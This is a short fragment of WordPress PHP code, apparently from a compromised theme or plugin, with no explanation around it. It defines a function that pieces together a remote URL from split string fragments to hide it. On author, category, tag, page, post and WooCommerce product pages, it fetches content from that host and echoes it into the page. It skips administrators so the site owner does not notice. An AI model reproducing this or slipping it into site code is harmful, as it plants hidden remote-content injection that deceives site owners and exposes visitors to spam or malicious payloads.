...
function add_after_post_content($content) {
		$addcontent = array('htt','p://','more','listed.','com/');
		$addim = implode($addcontent);
	if (!current_user_can('manage_options') && is_author()){
		echo @file_get_contents($addim."type");
	}elseif (!current_user_can('manage_options') && is_category()){
		echo @file_get_contents($addim."type1");
	}elseif (!current_user_can('manage_options') && is_tag()){
		echo @file_get_contents($addim."type2");
	}elseif (!current_user_can('manage_options') && !is_front_page() && !is_home() && is_page()){
		echo @file_get_contents($addim."type3");
	}elseif (!current_user_can('manage_options') && !is_product() && is_single()){
		echo @file_get_contents($addim."type4");
	}elseif (!current_user_can('manage_options') && is_product_category()){
		echo @file_get_contents($addim."type5");
	}elseif (!current_user_can('manage_options') && is_product_tag()){
		echo @file_get_contents($addim."type6");
	}elseif (!current_user_can('manage_options') && is_product()){
		echo @file_get_contents($addim."type7");
	}
	return $content;
}
add_action( 'avad', 'add_after_post_content' );
